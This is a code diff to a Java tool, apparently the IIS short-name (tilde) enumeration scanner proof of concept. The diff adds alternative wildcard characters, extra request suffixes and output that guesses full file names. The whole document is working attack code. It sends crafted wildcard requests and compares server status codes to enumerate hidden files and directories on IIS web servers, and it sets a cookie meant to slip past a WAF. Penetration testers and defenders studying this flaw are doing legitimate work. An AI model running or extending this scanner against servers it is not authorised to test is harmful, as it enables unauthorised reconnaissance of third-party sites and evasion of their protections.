@@ -7,7 +7,7 @@ public class scanner {
 	/* { Custom Config */
 
 	private final static boolean debugMode = false;
-	private final static String strVersion = "1.9.7 - 28April2014";
+	private final static String strVersion = "1.9.8 - 10July2014";
 	private final static String customUserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10";
 	private final static String customCookie = "IIS_Shortname_Scanner_PoC=1;"; // Your cookie information. Can be a hidden value that will pass your WAF.
 	private final static String additionalQuery = "?aspxerrorpath=/"; // In order to see the errors better than a normal request
@@ -36,6 +36,8 @@ public class scanner {
 	private String validStatus = "";
 	private String invalidStatus = "";
 	private boolean boolIsQuestionMarkReliable = false;
+	private String questionMarkSymbol = "?"; // in Windows we can sometimes use > instead of ?
+	private String asteriskSymbol = "*"; // in Windows we can sometimes use < instead of * - only change this if you need to (it misses items)
 	private boolean boolIsExtensionReliable = false;
 	private int threadCounter = 0;
 	private ThreadPool threadPool = new ThreadPool(0);
@@ -169,7 +171,7 @@ public class scanner {
 
 	private void doScan(String url) throws Exception {
 		destURL = url;
-		String[] magicFinalPartList = {"\\a.aspx","/a.aspx","/a.shtml","/a.asp","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","/a.xxx",""};
+		String[] magicFinalPartList = {"\\a.asp","/a.asp","\\a.aspx","/a.aspx","/a.shtml","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","/a.xxx",""};
 		boolean isReliableResult = false;
 		// Create the proxy string
 		if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
@@ -202,12 +204,26 @@ public class scanner {
 		System.out.println("\r\n\r\n--------- Final Result ---------");
 		System.out.println(getReqCounter() + " requests have been sent to the server:");
 		if (!finalResultsDirs.isEmpty() || !finalResultsFiles.isEmpty()) {
+			String additionalData = "";
 			for (String s : finalResultsDirs) {
-				System.out.println("Dir: " + s);
+				additionalData = "";
+				if  (s.indexOf("~") < 6)
+					additionalData = " -- Actual directory name = " + s.substring(0,s.indexOf("~"));
+				if  (s.length() - s.lastIndexOf(".") <= 3)
+					additionalData += " -- Actual extension = " + s.substring(s.lastIndexOf("."));
+		
+				System.out.println("Dir: " + s + additionalData);
+				
 			}
 
 			for (String s : finalResultsFiles) {
-				System.out.println("File: " + s);
+				additionalData = "";
+				if  (s.indexOf("~") < 6)
+					additionalData = " -- Actual file name = " + s.substring(0,s.indexOf("~"));
+				if  (s.length() - s.lastIndexOf(".") <= 3)
+					additionalData += " -- Actual extension = " + s.substring(s.lastIndexOf("."));
+				System.out.println("File: " + s + additionalData);
+				//System.out.println("File: " + s + "   " + s.substring(s.lastIndexOf(".")) + "   " + String.valueOf((s.length() - s.lastIndexOf("."))));
 			}
 		}
 		System.out.println();
@@ -248,9 +264,9 @@ public class scanner {
 
 			public void run() {
 				try {
-					String statusCode = GetStatus("/*" + strInput + "*~1*" + magicFinalPart); // Should be valid to be added to the list
+					String statusCode = GetStatus("/*" + strInput + asteriskSymbol + "~1*" + magicFinalPart); // Should be valid to be added to the list
 					if (statusCode.equals("404")) {
-						statusCode = GetStatus("/1234567890" + strInput + "*~1*" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters! 
+						statusCode = GetStatus("/1234567890" + strInput + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters! 
 						if (!statusCode.equals("404")) {
 							addValidCharToName(strInput); // Valid character - add it to the list
 							if (debugMode) {
@@ -277,9 +293,9 @@ public class scanner {
 
 			public void run() {
 				try {
-					String statusCode = GetStatus("/*~1.*" + strInput + "*" + magicFinalPart); // Should be valid to be added to the list
+					String statusCode = GetStatus("/" + asteriskSymbol + "~1." + asteriskSymbol + strInput + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list
 					if (statusCode.equals("404")) {
-						statusCode = GetStatus("/*~1.*" + strInput + "1234567890" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
+						statusCode = GetStatus("/" + asteriskSymbol + "~1." + asteriskSymbol + strInput + "1234567890" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
 						if (!statusCode.equals("404")) {
 							addValidCharToExtension(strInput); // Valid character - add it to the list
 							if (debugMode) {
@@ -427,10 +443,10 @@ public class scanner {
 		}else{
 			if (strInput.length() < 6) {
 				try {
-					String statusCode = GetStatus("/" + strInput + "?*~1*" + magicFinalPart);
+					String statusCode = GetStatus("/" + strInput + questionMarkSymbol + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);
 					if (statusCode.equals("404")) {
 						result = 0; // This file is not completed
-						statusCode = GetStatus("/" + strInput + "~1*" + magicFinalPart);
+						statusCode = GetStatus("/" + strInput + "~1" + asteriskSymbol + magicFinalPart);
 						if (statusCode.equals("404")) {
 							result = 2; // This file is available but there is more as well
 						}
@@ -536,7 +552,7 @@ public class scanner {
 				String[] temp = strInput.split("\\.");
 				if (temp[1].length() >= extLength) {
 					result = true;
-				} else if (GetStatus("/" + strInput + ".*" + magicFinalPart).equals("404")) {
+				} else if (GetStatus("/" + strInput + "." + asteriskSymbol + magicFinalPart).equals("404")) {
 					result = true;
 				} else if (!HTTPReqResponse(strInput + magicFinalPart, 0).equals(HTTPReqResponse(strInput + "xxx" + magicFinalPart, 0))) {
 					result = true;
@@ -568,7 +584,7 @@ public class scanner {
 			result =1;
 		}else{
 			try {
-				String statusCode = GetStatus("/" + strInput + "?" + magicFinalPart);
+				String statusCode = GetStatus("/" + strInput + questionMarkSymbol + magicFinalPart);
 				if (statusCode.equals("404")) {
 					result = 1; // A directory
 				}
@@ -612,11 +628,11 @@ public class scanner {
 	private boolean isReliable() {
 		boolean result = false;
 		try {
-			validStatus = HTTPReqResponse("/*~1*" + magicFinalPart, 0);
-			invalidStatus = HTTPReqResponse("/1234567890*~1*" + magicFinalPart, 0);
+			validStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
+			invalidStatus = HTTPReqResponse("/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
 			if (!validStatus.equals(invalidStatus)) {
-				String tempInvalidStatus1 = HTTPReqResponse("/0123456789*~1*" + magicFinalPart, 0);
-				String tempInvalidStatus2 = HTTPReqResponse("/0123456789*~1.1234*" + magicFinalPart, 0);
+				String tempInvalidStatus1 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
+				String tempInvalidStatus2 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, 0);
 				
 				if (tempInvalidStatus1.equals(invalidStatus)) // If two different invalid requests lead to different answers, we cannot rely on the responses!
 				{
@@ -651,9 +667,9 @@ public class scanner {
 			if (!validStatus.equals(""))
 				initValidStatus = validStatus;
 			else
-				initValidStatus = HTTPReqResponse("/*~1*" + magicFinalPart, 0);
+				initValidStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
 			
-			String tempValidStatus = HTTPReqResponse("/?*~1*" + magicFinalPart, 0);
+			String tempValidStatus = HTTPReqResponse("/?" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
 			if (initValidStatus.equals(tempValidStatus)) {
 					result = true;
 			}
@@ -663,6 +679,27 @@ public class scanner {
 			}
 			//System.out.println("isQuestionMarkReliable Error: " + err.toString());
 			result = false;
+		}
+		if(result==false){
+			try {
+				String initValidStatus = "";
+				if (!validStatus.equals(""))
+					initValidStatus = validStatus;
+				else
+					initValidStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
+				
+				String tempValidStatus = HTTPReqResponse("/>" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
+				if (initValidStatus.equals(tempValidStatus)) {
+						result = true;
+						questionMarkSymbol = ">";
+				}
+			} catch (Exception err) {
+				if (debugMode) {
+					err.printStackTrace();
+				}
+				//System.out.println("isQuestionMarkReliable Error: " + err.toString());
+				result = false;
+			}
 		}
 		if (debugMode) {
 			System.out.println("isQuestionMarkReliable = " + result);
